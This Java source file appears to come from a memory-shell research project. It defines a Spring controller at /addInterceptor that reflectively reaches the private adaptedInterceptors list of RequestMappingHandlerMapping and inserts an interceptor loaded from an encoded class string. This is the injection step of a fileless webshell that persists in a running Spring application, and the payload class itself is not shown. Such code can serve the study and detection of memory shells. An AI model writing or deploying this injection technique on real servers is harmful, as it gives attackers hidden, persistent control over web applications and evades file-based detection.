package org.su18.memshell.spring.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;

import static org.su18.memshell.spring.controller.DynamicUtils.INTERCEPTOR_CLASS_STRING;

/**
 * 访问此接口动态添加 Interceptor
 *
 * @author su18
 */
@Controller
@RequestMapping(value = "/addInterceptor")
public class AddInterceptor {

	@GetMapping()
	public void index(HttpServletRequest request, HttpServletResponse response) throws Exception {

		// 获取当前应用上下文
		WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

		// 通过 context 获取 RequestMappingHandlerMapping 对象
		RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

		// 为什么写三个 getSuperclass ？就是玩~
		Field f = mapping.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adaptedInterceptors");
		f.setAccessible(true);
		List<HandlerInterceptor> list = (List<HandlerInterceptor>) f.get(mapping);
		list.add((HandlerInterceptor) DynamicUtils.getClass(INTERCEPTOR_CLASS_STRING).newInstance());
		response.getWriter().println("interceptor added");


	}
}